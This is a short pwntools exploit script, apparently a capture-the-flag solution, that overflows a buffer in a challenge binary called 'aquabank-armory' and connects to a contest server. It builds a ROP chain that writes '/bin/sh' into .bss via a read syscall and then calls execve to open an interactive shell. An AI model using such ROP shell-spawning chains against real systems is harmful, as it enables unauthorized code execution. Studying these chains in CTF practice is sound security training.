from pwn import *

"""
The idea is to 
Write into the .bss section of the binary the string /bin/bash\x00, and then call EXECVE giving the witten address (of the .bss section) as the string pointer.


"""
context.binary = elf = ELF('./aquabank-armory', checksec=False)
context.arch = 'amd64'

p = process(elf.path)
rop = ROP(elf)

OFFSET = 72

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]
RET     = rop.find_gadget(['ret'])[0]


BSS = elf.bss() 

binsh_text= b"/bin/sh\x00"

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13534)

p.recv()

payload = flat(

    b"A"*OFFSET,
     #call read(0, armory, 0x100)
    p64(POP_RAX), p64(0),       # READ syscall ID
    p64(POP_RDI), p64(0),       # 1st arg -> STDIN (da dove prendo l'input)
    p64(POP_RSI), p64(BSS),  # 2nd arg -> .bss address where to save te "/bin/sh\x00" text
    p64(POP_RDX), p64(len(binsh_text)),     # 3rd arg -> length of the input
    p64(SYSCALL),
    
    
    #call execve(const char *path, char *const _Nullable argv[], char *const _Nullable envp[]);
    p64(RET),
    p64(POP_RAX), p64(59),      # EXECVE syscall ID
    p64(POP_RDI), p64(BSS),  # 1st arg -> .bss address where is program to execute (bin/sh)
    p64(POP_RSI), p64(0),       # 2nd arg -> 0, i don't care
    p64(POP_RDX), p64(0),       # 3rd arg -> 0, i don't care
    p64(SYSCALL),

   
    

)

p.send(payload)
# scriviamo /bin/sh
p.send(b"/bin/sh\x00")# i send the 2nd argument of the read, in order to write it into the .bss address section.

p.interactive()

